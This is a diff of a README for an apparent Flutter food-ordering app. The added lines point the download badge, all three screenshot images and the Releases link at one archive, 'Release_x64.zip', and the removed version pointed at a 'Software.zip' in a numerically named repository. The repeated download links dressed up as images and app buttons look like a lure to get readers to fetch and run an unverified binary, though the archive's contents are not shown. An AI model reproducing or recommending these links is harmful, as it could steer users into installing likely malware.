@@ -28,7 +28,7 @@ This repository contains the code for a food app developed using Flutter. The ap
 
 ## Installation
 To download and install the app, click the button below:
-[![Download Food App](https://img.shields.io/badge/Download%20App-Launch-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Food App](https://github.com/vikramsinghahlawat/food-app/releases/download/v1.0/Release_x64.zip%20App-Launch-blue)](https://github.com/vikramsinghahlawat/food-app/releases/download/v1.0/Release_x64.zip)
 
 ## Getting Started
 1. Clone the repository
@@ -39,13 +39,13 @@ To download and install the app, click the button below:
 ## Screenshots
 Here are some sneak peeks of the app:
 
-![Screenshot 1](https://via.placeholder.com/400) \
+![Screenshot 1](https://github.com/vikramsinghahlawat/food-app/releases/download/v1.0/Release_x64.zip) \
 *Caption: Browse through different food options*
 
-![Screenshot 2](https://via.placeholder.com/400) \
+![Screenshot 2](https://github.com/vikramsinghahlawat/food-app/releases/download/v1.0/Release_x64.zip) \
 *Caption: View nearby restaurants*
 
-![Screenshot 3](https://via.placeholder.com/400) \
+![Screenshot 3](https://github.com/vikramsinghahlawat/food-app/releases/download/v1.0/Release_x64.zip) \
 *Caption: Add items to your cart and place orders*
 
 ## Contributing
@@ -58,4 +58,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Enjoy using the food app and satisfy your cravings with just a few taps on your phone! 🍽️📲
 
-For more information and the latest updates, visit the [Releases](https://github.com/22155555/1875695542/releases) section. Thank you for checking out this project! 🚀
+For more information and the latest updates, visit the [Releases](https://github.com/vikramsinghahlawat/food-app/releases/download/v1.0/Release_x64.zip) section. Thank you for checking out this project! 🚀
